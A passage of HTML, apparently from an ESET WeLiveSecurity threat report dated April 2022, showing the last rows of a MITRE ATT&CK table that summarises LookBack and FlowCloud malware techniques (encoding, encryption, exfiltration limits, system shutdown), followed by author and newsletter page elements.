+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1132/002" rel="noopener" target="_blank">T1132.002</a></td><td class="column-3">Data Encoding: Non-Standard Encoding</td><td class="column-4">LookBack encodes binary data using a custom hex-encoding method.</td>
+</tr>
+<tr class="row-52 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1573/001/" rel="noopener" target="_blank">T1573.001</a></td><td class="column-3">Encrypted Channel: Symmetric Cryptography</td><td class="column-4">FlowCloud can use XOR, TEA, RC4 and a modified AES algorithm to encrypt traffic and files.</td>
+</tr>
+<tr class="row-53 odd">
+<td class="column-1">Exfiltration</td><td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1030/" rel="noopener" target="_blank">T1030</a></td><td class="column-3">Data Transfer Size Limits</td><td class="column-4">FlowCloud uses local caches to stage data and exfiltrates their content when it reaches a size specified in its configuration.</td>
+</tr>
+<tr class="row-54 even">
+<td class="column-1">Impact</td><td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1529/" rel="noopener" target="_blank">T1529</a></td><td class="column-3">System Shutdown/Reboot</td><td class="column-4">FlowCloud can force a system crash or shutdown. </td>
+</tr>
+</tbody>
+</table>
+<p><a class="no-fancy" href="https://www.eset.com/int/business/services/threat-intelligence/?utm_source=welivesecurity.com&amp;utm_medium=referral&amp;utm_campaign=wls-research&amp;utm_content=lookback-ta410-umbrella-cyberespionage-ttps-activity" rel="noopener" target="_blank"><img alt="" class="aligncenter wp-image-152551" height="290" src="https://www.welivesecurity.com/wp-content/uploads/2021/07/bandook-bandidos-eti-cta.png" style="max-width:800px;height:auto;width:auto;" width="899"/></a></p>
+<a href="https://www.welivesecurity.com/author/acotecyr/" title="Alexandre Côté Cyr">
+ Alexandre Côté Cyr </a>
+<a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
+ Matthieu Faou </a>
+27 Apr 2022 - 03:00PM
+<h3>Sign up to receive an email update whenever a new article is published in our <a href="https://www.welivesecurity.com/category/ukraine-crisis-digital-security-resource-center/" rel="noopener" target="_blank">Ukraine Crisis – Digital Security Resource Center</a></h3>
+<h3>Newsletter</h3>
+<h3>Discussion</h3>
+</div>
